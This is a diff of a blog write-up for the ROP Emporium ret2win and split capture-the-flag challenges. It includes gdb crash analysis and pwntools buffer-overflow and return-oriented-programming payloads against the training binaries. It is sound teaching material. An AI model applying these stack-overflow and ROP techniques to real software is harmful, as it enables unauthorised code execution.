@@ -1,6 +1,6 @@
 ---
 layout: post
-title: 	"ROP Emporium: All Challenges"
+title: 	"ROP Emporium: All Challenges (Detailed Explanations)"
 date:	2019-07-19 20:52:55 +0800
 categories: writeups rop-emporium
 ---
@@ -204,7 +204,7 @@ The last function we have to check is `ret2win()`.
 ```
 It's a tiny function that just calls `system("/bin/cat flag.txt")`. This is the function we want to jump to. Seems easy enough.
 
-Now that we know what to do, let's crash the binary and see where it crashes. I like to use gdb gef for this as it has its own built in `pattern create` and `pattern offset` shown below.
+Now that we know what to do, let's attempt to crash the program and see exactly where the crash occurs. I like to use gdb gef for this as it has its own built in `pattern create` and `pattern offset` shown below.
 
 ```shell
 gef➤  pattern create 50
@@ -253,7 +253,7 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
 [#0] Id 1, Name: "ret2win", stopped, reason: SIGSEGV
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-gef➤  patter offset 0x6161616c 50
+gef➤  pattern offset 0x6161616c 50
 [+] Searching '0x6161616c'
 [+] Found at offset 44 (little-endian search) likely
 [+] Found at offset 41 (big-endian search) 
@@ -272,8 +272,8 @@ elf = ELF("./ret2win")
 
 ret2win_addr = elf.symbols['ret2win']
 
-payload = "A"*44
-payload += p32(ret2win_addr)
+payload = "A"*40 + "A"*4 # 40 A's for the buffer, 4 A's to overwrite EBP
+payload += p32(ret2win_addr) # Overwrite EIP with the address to ret2win()
 
 sh = elf.process()
 
@@ -374,9 +374,9 @@ gef➤
 
 We see that we don't overwrite RIP at all. This is because we overwrote RIP with an invalid address greater than `0x00007fffffffffff`, which is the maximum address size of a 64 bit system. This causes the OS to raise an exception and thus not update RIP's value at all.
 
-However, we did overwrite RBP, and we know that the RIP exists 8 bytes past RBP's address. Finding the offset for RIP (32) then adding 8 to it, gives us the offset for RIP, which is 40.
+However, we did overwrite RBP, and we know that the RIP exists 8 bytes past RBP's address. Finding the offset for RBP (32) then adding 8 to it, gives us the offset for RIP, which is 32+8=40.
 
-Note that we still have control of RIP, it's just that we can't write an invalid address to it. Fortunately, the address to the `ret2win()` function is a valid address, so the following script does the job.
+Note that we still have control of RIP, it's just that we can't write an invalid address to it. Fortunately, the address to the `ret2win()` function *is* a valid address, so the following script does the job.
 
 ```python
 #!/usr/bin/env python
@@ -389,8 +389,8 @@ elf = ELF("./ret2win")
 
 ret2win_addr = elf.symbols['ret2win']
 
-payload = "A"*40
-payload += p64(ret2win_addr)
+payload = "A"*32 + "A"*8 # 32 A's for the buffer, 8 A's to overwrite RBP
+payload += p64(ret2win_addr) # Overwrite RIP with the address to ret2win()
 
 sh = elf.process()
 
@@ -505,15 +505,25 @@ Let's take a look at `usefulFunction()`.
 [0x08048649]> 
 ```
 
-This calls `system("/bin/ls")`, which is not what we want. We want `system("/bin/cat flag.txt")`.
+This calls `system("/bin/ls")`, which is not what we want. We want `system("/bin/cat flag.txt")`. How do we change the argument that `system()` gets called with?
 
-The way we get around this is to call system ourselves, and set up the call stack so that system gets the address of the string "/bin/cat flag.txt" as its argument. Remember that when a function is called, it expects the stack to look like this (memory addresses increase towards the right):
+The way we get around this is to call `system()` ourselves. We set up the stack such that EIP jumps to the address to `system()`'s (thus calling it in the process). We want the first argument to be the address of the string "/bin/cat flag.txt". Therefore, we want the stack to look like this:
 
-\<return_addr\>  ---\>  \<arguments\>
+```
+{overwritten_eip_with_addr_to_system}
+            ↓
+{return_addr_of_system}
+            ↓
+{first_argument_of_system}
+```
 
-So what we want is to overwrite EIP with the address to `system()`. The next four bytes immediately following that will be the return address of `system()` (which doesn't matter). The next four bytes must be the address of the "/bin/cat flag.txt" string in memory. This will result in `system("/bin/cat flag.txt"` being called. If this is confusing you, please review how function arguments are passed through the stack.
+So this is what we want to do:
 
-Let's find the addresses then. I use rabin2 to find addresses of strings, and gdb to find the address of `system@plt`. For more information about how the Global Offset Table (GOT) and the Procedure Linkage Table (PLT) work, see [this](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html).
+1. Overwrite EIP with the address to `system()`
+2. The next four bytes will be the return address of `system()`. This can be gibberish and doesn't matter.
+3. The next four bytes must be the address to the string "/bin/cat flag.txt". This is `system()`'s first argument.
+
+I use rabin2 to find addresses of strings, and gdb to find the address of `system@plt`. For more information about how the Global Offset Table (GOT) and the Procedure Linkage Table (PLT) work, see [this](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html).
 ```shell
 root@kali:~/Documents/ropemporium/split/32split# rabin2 -z split32 
 [Strings]
@@ -533,6 +543,9 @@ gef➤  print 'system@plt'
 $1 = {<text variable, no debug info>} 0x8048430 <system@plt>
 gef➤  
 ```
+`system@plt is at 0x8048430`
+
+`"/bin/cat flag.txt" is at 0x0804a030`
 
 Writing a simple exploit script with the given information.
 ```python
@@ -571,9 +584,18 @@ $
 
 The 64-bit version is slightly more difficult because function arguments don't get passed through the stack anymore.
 
-When a function is called, the function's arguments are passed in through 6 registers. In order (from the 1st to the 6th argument), the registers are `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`. In this case, since we want to call `system()` with the address to the string "/bin/cat flag.txt", we have to first put this address into `rdi` before calling `system()`.
+When a function is called, the function's arguments are passed in through 6 registers. The registers are (in order from the 1st to the 6th argument):
 
-This is where a tool like ropper comes into play. What ropper does is it goes through a binary and finds all occurrences of these things called "gadgets". An example of a gadget is `pop rdi; ret;`, which simply pops the top value off the stack into the RDI register, then returns out to the next value on the stack. This is known as a "pop rdi gadget". Another gadget might be a `pop rsi; pop r15; ret;` gadget, which you can return into after the pop rdi gadget, in order to call a function with more than one argument.
+1. rdi
+2. rsi
+3. rdx
+4. rcx
+5. r8
+6. r9
+
+In this case, since we want to call `system()` with the address to the string "/bin/cat flag.txt", we have to first put this address into `rdi` before calling `system()`.
+
+This is where a tool like ropper comes into play. What ropper does is it goes through a binary and finds all occurrences of these bits of assembly called "gadgets". An example of a gadget is `pop rdi; ret;`, which simply pops the top value off the stack into the RDI register, then returns out to the next value on the stack. This is known as a "pop rdi gadget". Another gadget might be a `pop rsi; pop r15; ret;` gadget, which you can return into out of a pop rdi gadget. This would allow you to control up to three arguments to a function!
 
 A pop rdi gadget works well for us since `system()` only requires one argument.. We start out by using ropper to find a pop rdi gadget.
 
@@ -599,6 +621,8 @@ Gadgets
 91 gadgets found
 root@kali:~/Documents/ropemporium/split/64split# 
 ```
+
+`"pop rdi; ret;" at 0x0000000000400883`
 
 Now, this is what we need to do.
 
